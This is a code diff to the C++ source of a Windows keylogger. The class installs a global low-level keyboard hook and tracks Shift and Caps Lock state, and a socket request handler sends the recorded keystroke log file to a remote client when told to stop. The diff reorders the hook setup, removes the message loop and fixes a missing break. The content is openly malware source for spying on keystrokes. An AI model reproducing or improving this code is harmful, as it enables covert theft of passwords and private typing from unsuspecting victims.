@@ -14,7 +14,7 @@ DWORD Keylogger::dwThreadID = 0;
 std::atomic_bool Keylogger::isShiftPressed = false;
 std::atomic_bool Keylogger::isCapsLockOn = false;
 
-DWORD WINAPI Keylogger::SKeylogger() {
+DWORD WINAPI Keylogger::SKeylogger(LPVOID *) {
     if (isKeyloggerRunning) {
         return 1;
     }
@@ -22,6 +22,8 @@ DWORD WINAPI Keylogger::SKeylogger() {
     if (!hKeyboardInstance) {
         return 1;
     }
+    isShiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
+    isCapsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
     hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hKeyboardInstance, 0);
     if (!hKeyboardHook) {
         hKeyboardInstance = nullptr;
@@ -38,14 +40,6 @@ DWORD WINAPI Keylogger::SKeylogger() {
         hKeyboardHook = nullptr;
         hKeyboardInstance = nullptr;
         return 1;
-    }
-    MSG msg;
-    isShiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
-    isCapsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
-    while (isKeyloggerRunning && GetMessage(&msg, nullptr, 0, 0)) {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-        Sleep(10);
     }
     return 0;
 }
@@ -463,9 +457,10 @@ void Keylogger::HandleRequest(SOCKET client_socket, const PacketHeader &header) 
             } else {
                 StopKeylogger();
                 Response response(header.request_id, 0x00); // Stopped successfully
-                File::SendFile(this->KEYLOG_FILENAME.c_str(), client_socket, header);
+                File::SendFile(KEYLOG_FILENAME.c_str(), client_socket, header);
                 response.sendResponse(client_socket);
             }
+            break;
         }
         case 0x03: {
             Response response(header.request_id, 0x04);
